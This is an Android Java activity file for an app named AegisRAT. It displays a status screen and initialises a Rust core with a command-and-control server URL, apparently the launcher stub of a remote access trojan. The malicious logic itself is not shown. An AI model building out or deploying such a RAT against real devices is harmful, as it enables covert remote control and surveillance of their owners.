package com.aegis.rat;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Simple UI to prove it's running
        TextView tv = new TextView(this);
        tv.setText("AegisRAT Active\nC2: http://<YOUR_IP>:5000");
        tv.setPadding(32, 32, 32, 32);
        setContentView(tv);

        // Initialize the Rust Core
        // Replace 127.0.0.1 with your actual machine IP if testing on a physical device
        AegisCore.init(this, "http://10.0.2.2:5000"); 
    }
}
